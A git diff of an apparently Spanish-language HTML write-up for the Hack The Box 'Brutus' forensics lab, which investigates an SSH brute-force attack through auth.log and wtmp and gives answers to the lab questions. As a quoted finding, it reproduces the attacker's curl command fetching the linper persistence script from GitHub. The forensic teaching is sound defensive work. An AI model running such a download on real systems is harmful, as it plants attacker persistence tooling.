@@ -167,7 +167,8 @@
                   <span><i class="fab fa-linux"></i> Linux</span>
                   <span><i class="fas fa-calendar-alt"></i> 2024</span>
                 </div>
-                <button class="machine-action">Leer Writeup</button>
+                <button class="machine-action" onclick="showWriteup('brutus'); event.stopPropagation();">Leer
+                  Writeup</button>
               </div>
 
               <div class="machine-card">
@@ -269,7 +270,8 @@
                 atacante realizó actividades adicionales, las cuales podemos rastrear usando <code>auth.log</code>.
                 Aunque <code>auth.log</code> se utiliza principalmente para el análisis de fuerza bruta, profundizaremos
                 en todo el potencial de este artefacto en nuestra investigación, incluyendo aspectos de escalada de
-                privilegios, persistencia, e incluso cierta visibilidad en la ejecución de comandos.</p>
+                privilegios, persistencia, e incluso cierta visibilidad en la ejecución de comandos.
+              </p>
               <p>El archivo <code>auth.log</code> se utiliza principalmente para rastrear mecanismos de autenticación.
                 Cada vez que un usuario intenta iniciar sesión, cambiar de usuario o realizar cualquier tarea que
                 requiera autenticación, se realiza una entrada en este archivo de log. Esto incluye actividades que
@@ -283,7 +285,8 @@
                 </li>
                 <li><strong>Nombre de Host:</strong> El nombre del sistema en el que ocurrió el evento.</li>
                 <li><strong>Servicio:</strong> El nombre del demonio o servicio que informa el evento, como
-                  <code>sshd</code> para el demonio SSH.</li>
+                  <code>sshd</code> para el demonio SSH.
+                </li>
                 <li><strong>PID:</strong> El ID de Proceso (PID) del servicio cuando se registró el evento.</li>
                 <li><strong>Usuario:</strong> El nombre de usuario involucrado en el proceso de autenticación.</li>
                 <li><strong>Estado de Autenticación:</strong> Detalla si el intento de autenticación fue exitoso o
@@ -299,7 +302,8 @@
 user admin from 192.168.1.101 port 22 ssh2</code></pre>
               <p>La entrada anterior muestra un intento de contraseña fallido para un usuario llamado "admin" en
                 <code>exampleserver</code> desde una IP de origen de <code>192.168.1.101</code> a través del puerto 22
-                (SSH).</p>
+                (SSH).
+              </p>
 
               <h4>wtmp</h4>
               <p>El archivo <code>wtmp</code> registra todos los eventos de inicio y cierre de sesión en el sistema. Es
@@ -354,7 +358,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                 <li><strong>sec (segundo):</strong> El sello de tiempo (<em>timestamp</em>) del evento.
                   <strong>Nota:</strong> Este sello de tiempo se presentará utilizando la zona horaria de su sistema y
                   no la zona horaria del sistema del que se tomó el <code>wtmp</code>. Deberá tener esto en cuenta al
-                  investigar una línea de tiempo de incidentes.</li>
+                  investigar una línea de tiempo de incidentes.
+                </li>
                 <li><strong>usec (microsegundos):</strong> El componente de microsegundos del sello de tiempo asociado
                   con un evento de inicio o cierre de sesión.</li>
                 <li><strong>Addr (Dirección):</strong> Información de dirección adicional, que podría ser la dirección
@@ -367,7 +372,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                 cumplimiento de las políticas de seguridad e investigar incidentes de seguridad.</p>
               <p>Muy bien, ahora que entendemos más sobre los artefactos proporcionados, profundicemos en el
                 <code>auth.log</code> para nuestro análisis. Abrimos nuestro <code>auth.log</code> en nuestro editor de
-                texto favorito y nos preparamos para responder las preguntas proporcionadas.</p>
+                texto favorito y nos preparamos para responder las preguntas proporcionadas.
+              </p>
 
               <hr>
 
@@ -384,7 +390,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                   <strong><code>65.2.161.68</code></strong>, lo que indica un ataque de fuerza bruta. Preste especial
                   atención a los sellos de tiempo, todos cayendo dentro de segundos. Una buena regla general al buscar
                   ataques de fuerza bruta es considerar: "¿Podría un humano intentar autenticarse con tanta frecuencia
-                  manualmente?". Si la respuesta es no, sugerimos una investigación adicional.</p>
+                  manualmente?". Si la respuesta es no, sugerimos una investigación adicional.
+                </p>
                 <div class="answer-box">
                   <strong>Respuesta:</strong> <code>65.2.161.68</code>
                 </div>
@@ -453,7 +460,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                   terminal interactiva por parte del TA a las <strong><code>06:32:45</code></strong>.</p>
                 <p>Como se describió anteriormente, este sello de tiempo se presentará utilizando la zona horaria de
                   nuestro sistema. Podemos verificar esto ejecutando el comando <code>date</code>. (El comando
-                  <code>date</code> mostró que la zona horaria del sistema era UTC).</p>
+                  <code>date</code> mostró que la zona horaria del sistema era UTC).
+                </p>
                 <p>Como la zona horaria de nuestro sistema es UTC, no necesitamos ajustarla y podemos confirmar que esta
                   es nuestra respuesta.</p>
                 <div class="answer-box">
@@ -520,7 +528,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                   desglosar los ataques de manera más granular. Por ejemplo, hay numerosos tipos de cuentas que podrían
                   crearse; en la captura de pantalla (no incluida) podemos ver Dominio, Local y Nube (<em>Cloud</em>).
                   En la investigación actual, sabemos que fue una cuenta local, por lo tanto, la sub-técnica es
-                  <strong>T1136.001</strong>.</p>
+                  <strong>T1136.001</strong>.
+                </p>
                 <div class="answer-box">
                   <strong>Respuesta:</strong> <code>T1136.001</code>
                 </div>
@@ -529,7 +538,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
               <div class="qa-block">
                 <h4>7. ¿A qué hora finalizó la primera sesión SSH del atacante según <code>auth.log</code>?</h4>
                 <p>En la pregunta 4 descubrimos que el ID de la sesión era 37. Podemos confirmar en el
-                  <code>auth.log</code> que la sesión 37 se cerró a las <strong><code>06:37:24</code></strong>.</p>
+                  <code>auth.log</code> que la sesión 37 se cerró a las <strong><code>06:37:24</code></strong>.
+                </p>
                 <div class="answer-box">
                   <strong>Respuesta:</strong> <code>2024-03-06 06:37:24</code>
                 </div>
@@ -545,7 +555,8 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
                   repositorio de GitHub usando <code>sudo</code>. El comando completo fue:
                   <strong><code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></strong>.
                   Esta acción indica la intención del atacante de desplegar herramientas o <em>malware</em> adicionales
-                  para una mayor explotación o persistencia.</p>
+                  para una mayor explotación o persistencia.
+                </p>
                 <div class="answer-box">
                   <strong>Respuesta:</strong>
                   <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code>
